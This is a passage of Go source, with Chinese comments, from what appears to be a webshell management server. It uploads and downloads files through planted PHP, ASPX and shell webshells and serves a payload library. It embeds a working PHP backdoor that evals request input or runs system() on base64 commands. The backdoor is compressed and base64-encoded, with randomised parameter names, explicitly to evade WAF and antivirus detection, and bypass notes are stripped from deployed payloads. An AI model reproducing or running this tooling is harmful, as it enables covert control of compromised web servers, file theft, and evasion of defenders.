		verify += "（注意：上传残留清单写入失败，删会话时需手填 path：" + err.Error() + "）"
	}
	writeJSON(w, 200, map[string]any{
		"name":        name,
		"remote_path": remotePath,
		"bytes":       total,
		"parts":       parts,
		"chunk":       chunk,
		"method":      how,
		"verify":      verify,
		"elapsed_ms":  time.Since(t0).Milliseconds(),
	})
}

// webshellRememberArtifact 记下上传写过的远端文件（去重，最多留 50 条）。
func (s *Server) webshellRememberArtifact(name, remotePath string) error {
	remotePath = strings.TrimSpace(remotePath)
	if remotePath == "" {
		return nil
	}
	path := s.webshellStorePath()
	webshellStoreMu.Lock()
	defer webshellStoreMu.Unlock()
	store, err := webshellLoadStore(path)
	if err != nil {
		return err
	}
	sess, ok := store[name]
	if !ok {
		return nil
	}
	for _, p := range sess.Artifacts {
		if p == remotePath {
			return nil
		}
	}
	sess.Artifacts = append(sess.Artifacts, remotePath)
	if len(sess.Artifacts) > 50 {
		sess.Artifacts = sess.Artifacts[len(sess.Artifacts)-50:]
	}
	store[name] = sess
	return webshellSaveStore(path, store)
}

func webshellUploadPHPChunk(ctx context.Context, name string, sess webshellSession, remotePath string, data []byte, appendMode bool, timeout time.Duration) (int, error) {
	out, err := webshellRunPHPCode(ctx, name, sess, webshellPHPWriteCode(remotePath, data, appendMode), timeout)
	if err != nil {
		return 0, err
	}
	t := strings.TrimSpace(out)
	m := webshellOKWriteRE.FindStringSubmatch(t)
	if m == nil {
		return 0, fmt.Errorf("远端写入分块失败: %s", webshellBrief(t, 200))
	}
	n, err := strconv.Atoi(m[1])
	if err != nil {
		return 0, fmt.Errorf("远端写入分块失败: %s", webshellBrief(t, 200))
	}
	return n, nil
}

func webshellUploadShellChunk(ctx context.Context, name string, sess webshellSession, remotePath string, data []byte, appendMode bool, timeout time.Duration) error {
	b := webshellB64Encode(data)
	if sess.Type == "aspx" {
		_, _, err := webshellExecCmd(ctx, name, sess, webshellPowerShellWriteCmd(remotePath, b, appendMode), timeout)
		return err
	}
	redir := "> "
	if appendMode {
		redir = ">> "
	}
	cmd := "printf '%s' " + webshellShellQuote(b) + " | base64 -d " + redir + webshellShellQuote(remotePath)
	_, _, err := webshellExecCmd(ctx, name, sess, cmd, timeout)
	return err
}

// webshellDownload 读远端文件：文本按文本回，二进制按 base64 回。
func (s *Server) webshellDownload(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	name := strings.TrimSpace(q.Get("name"))
	remotePath := strings.TrimSpace(q.Get("remote_path"))
	if name == "" {
		writeErr(w, 400, "缺少会话名")
		return
	}
	if remotePath == "" {
		writeErr(w, 400, "缺少远端路径 remote_path")
		return
	}
	want := strings.ToLower(strings.TrimSpace(q.Get("as")))
	if want == "" {
		want = "auto"
	}
	if want != "auto" && want != "text" && want != "b64" {
		writeErr(w, 400, "as 只支持 auto / text / b64，收到: "+want)
		return
	}
	maxBytes := webshellDownloadDefault
	if v := strings.TrimSpace(q.Get("max_bytes")); v != "" {
		if n, err := strconv.Atoi(v); err == nil {
			maxBytes = webshellClampInt(n, 1, webshellDownloadMax)
		}
	}
	timeout := webshellSeconds(0, 30, 1, 600)

	sess, err := s.webshellSessionByName(name)
	if err != nil {
		writeErr(w, webshellErrCode(err), err.Error())
		return
	}

	t0 := time.Now()
	var (
		size int64
		data []byte
		how  string
	)
	if (sess.Type == "php" || sess.Type == "php_raw") && webshellModeOf(name) != "raw" {
		out, err := webshellRunPHPCode(r.Context(), name, sess, webshellPHPReadCode(remotePath, maxBytes), timeout)
		if err != nil {
			if !errors.Is(err, errWSModeMismatch) {
				writeErr(w, 502, err.Error())
				return
			}
			webshellSetMode(name, "raw")
			data = nil
		} else {
			size, data, err = webshellParseOKRead(out)
			if err != nil {
				writeErr(w, 502, err.Error())
				return
			}
			how = "PHP file_get_contents"
		}
	}
	if how == "" {
		if sess.Type == "aspx" {
			out, _, err := webshellExecCmd(r.Context(), name, sess, webshellPowerShellReadCmd(remotePath, maxBytes), timeout)
			if err != nil {
				writeErr(w, 502, err.Error())
				return
			}
			size, data, err = webshellParseOKRead(out)
			if err != nil {
				writeErr(w, 502, err.Error())
				return
			}
			how = "PowerShell"
		} else {
			remoteSize, err := webshellReadRemoteSize(r.Context(), name, sess, remotePath, timeout)
			if err != nil {
				writeErr(w, 502, err.Error())
				return
			}
			size = remoteSize
			cmd := fmt.Sprintf("head -c %d %s | base64 | tr -d '\\n'", maxBytes, webshellShellQuote(remotePath))
			out, _, err := webshellExecCmd(r.Context(), name, sess, cmd, timeout)
			if err != nil {
				writeErr(w, 502, err.Error())
				return
			}
			blob := strings.Join(strings.Fields(out), "")
			if blob == "" && size > 0 {
				writeErr(w, 502, fmt.Sprintf("远端没有回传内容（%d 字节）: %s", size, webshellBrief(out, 160)))
				return
			}
			if blob != "" {
				data, err = webshellB64Decode(blob)
				if err != nil {
					writeErr(w, 502, fmt.Sprintf("远端内容 base64 解码失败（%v）: %s", err, webshellBrief(out, 160)))
					return
				}
			}
			how = "shell(head|base64)"
		}
	}
	if size > 0 && int64(len(data)) > size {
		data = data[:size] // 偶发填充导致的尾巴，按原始大小对齐
	}
	got := int64(len(data))
	truncated := size > got

	mode := want
	if want == "auto" {
		if webshellIsText(data) {
			mode = "text"
		} else {
			mode = "b64"
		}
	}
	body := ""
	if mode == "text" {
		body = webshellDecodeBody(data)
	} else {
		body = webshellB64Encode(data)
	}
	writeJSON(w, 200, map[string]any{
		"name":        name,
		"remote_path": remotePath,
		"size":        size,
		"returned":    got,
		"truncated":   truncated,
		"max_bytes":   maxBytes,
		"mode":        mode,
		"body":        body,
		"method":      how,
		"elapsed_ms":  time.Since(t0).Milliseconds(),
	})
}

// ---------------------------------------------------------------------------
// HTTP handlers —— payload 库
// ---------------------------------------------------------------------------

// webshellListPayloads 解析 payload 库元信息，按类型分组返回名称/类型/大小/说明。
func (s *Server) webshellListPayloads(w http.ResponseWriter, r *http.Request) {
	filter := strings.ToLower(strings.TrimSpace(r.URL.Query().Get("type")))
	if filter != "" {
		ok := false
		for _, t := range webshellPayloadTypes {
			if t == filter {
				ok = true
				break
			}
		}
		if !ok {
			writeErr(w, 400, "type 只支持 "+strings.Join(webshellPayloadTypes, "/")+"，收到: "+filter)
			return
		}
	}
	entries, err := webshellPayloadEntries(filter)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{
		"dir":     webshellPayloadRoot(),
		"types":   webshellPayloadTypes,
		"entries": entries,
		"total":   len(entries),
	})
}

// webshellGetPayload 返回某个 payload 的全文（严格路径校验，禁止越界）。
func (s *Server) webshellGetPayload(w http.ResponseWriter, r *http.Request) {
	typ := strings.TrimSpace(r.PathValue("type"))
	file := strings.TrimSpace(r.PathValue("file"))
	entry, content, err := webshellReadPayload(typ, file)
	if err != nil {
		writeErr(w, webshellErrCode(err), err.Error())
		return
	}
	// 加密型载荷在这里才生成正文与参数名；param 可指定，留空则每次随机。
	content, dynamicParam, err := webshellRenderDynamicPayload(content, strings.TrimSpace(r.URL.Query().Get("param")))
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	// 库里的文件头说明（@summary/@scene/...）只给本机的人看；下发的正文要剥掉，
	// 否则落地文件自带一份说明书：这是什么马、参数怎么用、绕哪类 WAF。
	content = webshellStripPayloadMeta(content)
	writeJSON(w, 200, map[string]any{
		"name":    entry.Name,
		"type":    entry.Type,
		"file":    entry.File,
		"size":    len(content),
		"meta":    entry.Meta,
		"content": content,
		"param":   dynamicParam,
	})
}

// ---------------------------------------------------------------------------
// 加密载荷（落地时生成）
// ---------------------------------------------------------------------------
//
// 内置库里带 __ARTEX_L__ 占位的 payload 是「加密马」：磁盘上只有一段 base64 密文，
// 明文逻辑与参数名都留到取用那一刻才拼进去。理由很实际——明文一句话马的
// `eval($_POST['pass'])`、`system(...)` 是 WAF/AV 的固定特征，落上去就被查杀；
// 参数名再固定成 pass / cmd / shell，等于把入口写在文件名旁边。
//
// 参数名一律随机字母+数字（首字符字母），与 webshell_mcp.py 的 ENC_* 保持逐字一致：
// 两边下发的是同一匹马，任何一侧改了 inner 逻辑，另一侧必须同步。

const (
	webshellEncKeyToken  = "__ARTEX_K__"
	webshellEncBlobToken = "__ARTEX_L__"
	// webshellEncInner 是被 gzinflate 的运行时逻辑：既吃 PHP 代码（eval 型协议），
	// 也吃 base64 命令（免杀降级协议），两个方向都能通。
	webshellEncInner = `$s=isset($_POST[$K])?$_POST[$K]:(isset($_GET[$K])?$_GET[$K]:'');` +
		`if($s!==''){if(strpos($s,'$')!==false||strpos($s,';')!==false){@eval($s);}else{@system(base64_decode($s));}}`
)

// webshellRandomParam 生成 n 位随机参数名（小写字母+数字，首字符为字母）。
func webshellRandomParam(n int) (string, error) {
	if n < 6 {
		n = 6
	}
	const letters = "abcdefghijklmnopqrstuvwxyz"
	const alnum = "abcdefghijklmnopqrstuvwxyz0123456789"
	buf := make([]byte, n)
	if _, err := rand.Read(buf); err != nil {
		return "", err
	}
	out := make([]byte, n)
	out[0] = letters[int(buf[0])%len(letters)]
	for i := 1; i < n; i++ {
		out[i] = alnum[int(buf[i])%len(alnum)]
	}
	return string(out), nil
}

// webshellRenderDynamicPayload 把占位载荷渲染成可直接落地的全文，并返回本次参数名。
// 非加密载荷原样返回（param 为空）。
func webshellRenderDynamicPayload(text, param string) (string, string, error) {
	if !strings.Contains(text, webshellEncBlobToken) {
		return text, "", nil
	}
	key := strings.TrimSpace(param)
	if key == "" {
		var err error
		key, err = webshellRandomParam(8)
		if err != nil {
			return "", "", fmt.Errorf("生成随机参数名失败: %v", err)
		}
	}
	if !webshellParamRE.MatchString(key) {
		return "", "", fmt.Errorf("param 非法（字母/数字/下划线，字母或下划线开头）: %s", key)
	}
	var buf bytes.Buffer
	zw, err := flate.NewWriter(&buf, flate.BestCompression)
	if err != nil {
		return "", "", fmt.Errorf("压缩载荷失败: %v", err)
	}
	if _, err := zw.Write([]byte(webshellEncInner)); err != nil {
		return "", "", fmt.Errorf("压缩载荷失败: %v", err)
	}
	if err := zw.Close(); err != nil {
		return "", "", fmt.Errorf("压缩载荷失败: %v", err)
	}
	blob := base64.StdEncoding.EncodeToString(buf.Bytes())
	out := strings.ReplaceAll(text, webshellEncBlobToken, blob)
	out = strings.ReplaceAll(out, webshellEncKeyToken, key)
	return out, key, nil
}

func webshellPayloadEntries(typeFilter string) ([]webshellPayloadEntry, error) {
	root, err := filepath.Abs(webshellPayloadRoot())
	if err != nil {
		root = webshellPayloadRoot()
	}
	if st, err := os.Stat(root); err != nil || !st.IsDir() {
		return nil, fmt.Errorf("payload 目录不存在: %s", root)
	}
	out := make([]webshellPayloadEntry, 0, 16)
	for _, typ := range webshellPayloadTypes {
		if typeFilter != "" && typ != typeFilter {
			continue
		}
		dir := filepath.Join(root, typ)
		if st, err := os.Stat(dir); err != nil || !st.IsDir() {
			continue
		}
		names, err := os.ReadDir(dir)
		if err != nil {
			return nil, fmt.Errorf("读取 payload 目录失败（%s）: %v", dir, err)
		}
		res := make([]string, 0, len(names))
		for _, de := range names {
			if de.IsDir() {
				continue
			}
			if !strings.HasSuffix(strings.ToLower(de.Name()), "."+typ) {
				continue
			}
			res = append(res, de.Name())
		}
		sort.Strings(res)
		for _, fn := range res {
			p := filepath.Join(dir, fn)
			text, err := webshellReadPayloadFile(p)
			if err != nil {
				return nil, err
			}
			out = append(out, webshellPayloadEntry{
				Name: typ + "/" + fn,
				Type: typ,
				File: fn,
				Size: len([]byte(text)),
				Meta: webshellPayloadMeta4(text),
			})
		}
	}
	return out, nil
}

// webshellReadPayload 校验 <type>/<file> 并读全文；任何越界尝试一律拒绝。
func webshellReadPayload(typ, file string) (webshellPayloadEntry, string, error) {
	if typ == "" || file == "" {
		return webshellPayloadEntry{}, "", fmt.Errorf("%w：名称必须形如 <类型>/<文件名>，例如 php/eval.php", errWSPayloadInvalid)
	}
	okType := false
	for _, t := range webshellPayloadTypes {
		if t == typ {
			okType = true
			break
		}
	}
	if !okType {
		return webshellPayloadEntry{}, "", fmt.Errorf("%w：类型只支持 %s，收到: %s", errWSPayloadInvalid, strings.Join(webshellPayloadTypes, "/"), typ)
	}
	if strings.ContainsAny(file, `\/`) || strings.Contains(file, "..") || !webshellPayloadFile.MatchString(file) {
		return webshellPayloadEntry{}, "", fmt.Errorf("%w：文件名只允许字母数字与 . _ -，收到: %s", errWSPayloadInvalid, file)
	}
	if !strings.HasSuffix(strings.ToLower(file), "."+typ) {
		return webshellPayloadEntry{}, "", fmt.Errorf("%w：%s 必须是 .%s 后缀（文件名与类型目录要对上）", errWSPayloadInvalid, file, typ)
	}
	root, err := filepath.Abs(webshellPayloadRoot())
	if err != nil {
		return webshellPayloadEntry{}, "", fmt.Errorf("payload 目录不可用: %v", err)
	}
	path, err := filepath.Abs(filepath.Join(root, typ, file))
	if err != nil {
		return webshellPayloadEntry{}, "", fmt.Errorf("payload 路径非法: %v", err)
	}
	// 双保险：即便目录里有符号链接，落点也必须仍在库目录内
	realRoot, rerr := filepath.EvalSymlinks(root)
	if rerr == nil {
		root = realRoot
	}
	if realPath, perr := filepath.EvalSymlinks(path); perr == nil {
		path = realPath
	}
	if path != root && !strings.HasPrefix(path, root+string(os.PathSeparator)) {
		return webshellPayloadEntry{}, "", fmt.Errorf("%w：拒绝越界访问 %s/%s", errWSPayloadInvalid, typ, file)
	}
	st, err := os.Stat(path)
	if err != nil || st.IsDir() {
		return webshellPayloadEntry{}, "", fmt.Errorf("%w: %s/%s", errWSPayloadNotFound, typ, file)
	}
	text, err := webshellReadPayloadFile(path)
	if err != nil {
		return webshellPayloadEntry{}, "", err
	}
	return webshellPayloadEntry{
		Name: typ + "/" + file,
		Type: typ,
		File: file,
		Size: len([]byte(text)),
		Meta: webshellPayloadMeta4(text),
	}, text, nil
}

func webshellReadPayloadFile(path string) (string, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("读取 payload 失败（%s）: %v", path, err)
	}
	if !utf8Valid(raw) {
		return "", fmt.Errorf("payload 不是合法 UTF-8 文本（%s）", path)
	}
	return string(raw), nil
}

// webshellPayloadMeta4 从文件头注释抠 @ 元信息；同一标签只取第一次出现的值。
// webshellStripPayloadMeta 剥掉载荷正文开头的说明注释块，保留 <?php 之类的起始标记。
// 与 webshell_mcp.py 的 _strip_payload_meta 行为一致。
func webshellStripPayloadMeta(text string) string {
	trimmed := strings.TrimLeft(text, " \t\r\n")
	head := ""
	rest := trimmed
	if m := webshellPHPTagRE.FindString(trimmed); m != "" {
		head = m
		rest = trimmed[len(m):]
	}
	comment := webshellPayloadHeadCommentRE.FindString(rest)
	if comment == "" {
		return text
	}
	rest = strings.TrimLeft(rest[len(comment):], "\r\n")
	if head == "" {
		return rest
	}
	return head + "\n" + rest
}

func webshellPayloadMeta4(text string) webshellPayloadMeta {
	meta := webshellPayloadMeta{}
	lines := strings.Split(text, "\n")
	if len(lines) > 80 {
		lines = lines[:80]
	}
	for _, line := range lines {
		for _, m := range webshellPayloadMetaRE.FindAllStringSubmatch(line, -1) {
			k := m[1]
			v := strings.TrimSpace(m[2])
			for _, tail := range []string{"*/", "--%>", "-->"} {
				if strings.HasSuffix(v, tail) {
					v = strings.TrimSpace(strings.TrimSuffix(v, tail))
				}
			}
			if v == "" {
				continue
			}
			switch k {
			case "summary":
				if meta.Summary == "" {
					meta.Summary = v
				}
			case "scene":
				if meta.Scene == "" {
					meta.Scene = v
				}
			case "perm":
				if meta.Perm == "" {
					meta.Perm = v
				}
			case "bypass":
				if meta.Bypass == "" {
					meta.Bypass = v
				}
			case "param":
				if meta.Param == "" {
					meta.Param = v
				}
			case "mcp":
				if meta.MCP == "" {
					meta.MCP = v
				}
			}
		}
	}
	return meta
}

// ---------------------------------------------------------------------------
// 其它
// ---------------------------------------------------------------------------

// webshellErrCode 把内部错误映射成 HTTP 状态码。
func webshellErrCode(err error) int {
	switch {
	case err == nil:
		return 200
	case errors.Is(err, errWSSessionNotFound), errors.Is(err, errWSPayloadNotFound):
		return 404
	case errors.Is(err, errWSPayloadInvalid):
		return 400
	case errors.Is(err, os.ErrNotExist):
		return 404
	default:
		return 500
	}
}
